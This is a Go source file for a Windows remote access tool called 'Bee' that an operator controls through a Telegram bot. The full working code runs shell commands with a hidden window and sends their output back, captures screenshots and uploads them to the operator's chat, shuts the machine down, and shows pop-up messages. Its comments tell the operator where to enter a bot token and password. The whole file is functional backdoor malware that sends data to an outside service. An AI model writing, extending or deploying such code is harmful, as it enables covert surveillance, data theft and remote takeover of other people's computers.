package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"unsafe"

	"image/png"

	"github.com/kbinani/screenshot"
	tgbotapi "gopkg.in/telegram-bot-api.v4"
)

func run(cmd string) string {
	cmd_path := "C:\\Windows\\system32\\cmd.exe"
	cmd_instance := exec.Command(cmd_path, "/c", cmd)
	cmd_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd_output, err := cmd_instance.Output()
	if err != nil {
		return "<error>"
	}
	return string(cmd_output)
}

func isfileexists(path string) bool {
	_, err := exec.LookPath(path)
	return err == nil
}

func writetofile(path string, content string) {
	f, err := os.Create(path)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer f.Close()
	f.WriteString(content)
}

func Screenshot(userName string) []byte {
	bounds := screenshot.GetDisplayBounds(0)

	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return nil
	} else {
		fileName := fmt.Sprintf("C:\\Users\\" + userName + "\\AppData\\Local\\scr.png")
		file, _ := os.Create(fileName)
		defer file.Close()
		png.Encode(file, img)
		buf := new(bytes.Buffer)
		png.Encode(buf, img)
		return buf.Bytes()
	}
}

func httpGet(url string) string {
	resp, err := http.Get(url)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return ""
	}
	return string(body)
}

func telegramNotification(token, chatid, text string) {
	httpGet("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatid + "&text=" + text)
}

func Exec() {
	bot, err := tgbotapi.NewBotAPI(TGTOKEN)
	if err != nil {
		log.Panic(err)
	}

	telegramNotification(TGTOKEN, strconv.FormatInt(TGCHATID, 10), "Bee is running!")

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	updates, _ := bot.GetUpdatesChan(u)

	for update := range updates {
		if update.Message != nil {
			blocks := strings.Split(update.Message.Text, " ")
			if TGCHATID == 0 {
				if blocks[0] == "/login" && len(blocks) == 2 {
					if blocks[1] == PASSWD {
						TGCHATID = update.Message.Chat.ID
						msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Logged in successfully!")
						writetofile("C:\\Users\\"+username+"\\AppData\\Local\\bee.auth", strconv.FormatInt(TGCHATID, 10))
						msg.ReplyToMessageID = update.Message.MessageID
						bot.Send(msg)
					} else {
						msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Wrong password!")
						msg.ReplyToMessageID = update.Message.MessageID
						bot.Send(msg)
					}
				} else {
					msg := tgbotapi.NewMessage(update.Message.Chat.ID, "You need to login first! Usage: /login {token}")
					msg.ReplyToMessageID = update.Message.MessageID
					bot.Send(msg)
				}
			} else {
				if blocks[0] == "/screenshot" {
					scrBytes := Screenshot(username)
					if scrBytes != nil {

						photoFileBytes := tgbotapi.FileBytes{
							Name:  "picture",
							Bytes: scrBytes,
						}
						photo := tgbotapi.NewPhotoUpload(update.Message.Chat.ID, photoFileBytes)
						bot.Send(photo)
						removefile("C:\\Users\\" + username + "\\AppData\\Local\\scr.png")
					} else {
						msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Error while taking screenshot!")
						msg.ReplyToMessageID = update.Message.MessageID
						bot.Send(msg)
					}
				} else if blocks[0] == "/shutdown" {
					msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Shutting down...")
					msg.ReplyToMessageID = update.Message.MessageID
					bot.Send(msg)
					run("shutdown /s /t 0")
				} else if blocks[0] == "/exec" && len(blocks) > 1 {
					msg := tgbotapi.NewMessage(update.Message.Chat.ID, run(strings.Join(blocks[1:], " ")))
					msg.ReplyToMessageID = update.Message.MessageID
					bot.Send(msg)
				} else if blocks[0] == "/msgbox" && len(blocks) > 1 && strings.Contains(strings.Join(blocks[1:], " "), "|") {
					msgblocks := strings.Split(strings.Join(blocks[1:], " "), "|")
					MessageBoxPlain(msgblocks[0], msgblocks[1])
					msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Messagebox has been opened!")
					msg.ReplyToMessageID = update.Message.MessageID
					bot.Send(msg)
				} else if blocks[0] == "/logout" {
					msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Logging out...")
					msg.ReplyToMessageID = update.Message.MessageID
					bot.Send(msg)
					removefile("C:\\Users\\" + username + "\\AppData\\Local\\bee.auth")
					break
				} else {
					msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Unknown or invalid command!")
					msg.ReplyToMessageID = update.Message.MessageID
					bot.Send(msg)
				}
			}
		}
	}
}

func MessageBox(hwnd uintptr, caption, title string, flags uint) int {
	cap, _ := syscall.UTF16PtrFromString(caption)
	tit, _ := syscall.UTF16PtrFromString(title)
	ret, _, _ := syscall.NewLazyDLL("user32.dll").NewProc("MessageBoxW").Call(
		uintptr(hwnd),
		uintptr(unsafe.Pointer(cap)),
		uintptr(unsafe.Pointer(tit)),
		uintptr(flags))

	return int(ret)
}

func MessageBoxPlain(title, caption string) int {
	const (
		NULL  = 0
		MB_OK = 0
	)
	return MessageBox(NULL, caption, title, MB_OK)
}

func readfile(path string) string {
	content, err := ioutil.ReadFile(path)
	if err != nil {
		fmt.Println(err)
		return ""
	}
	return string(content)
}

func removefile(path string) {
	os.Remove(path)
}

var PASSWD = "password!"                                       // Your password to use telegram administration panel
var TGTOKEN = "" 					       // Your telegram bot token
var TGCHATID int64 = 0                                         // Don't change this!
var username = ""                                              // Also don't change this!

func main() {
	username = strings.Split(run("echo %USERNAME%"), "\r\n")[0]
	if isfileexists("C:\\Users\\" + username + "\\AppData\\Local\\bee.auth") {
		TGCHATID, _ = strconv.ParseInt(readfile("C:\\Users\\"+username+"\\AppData\\Local\\bee.auth"), 10, 64)
	}
	Exec()
}
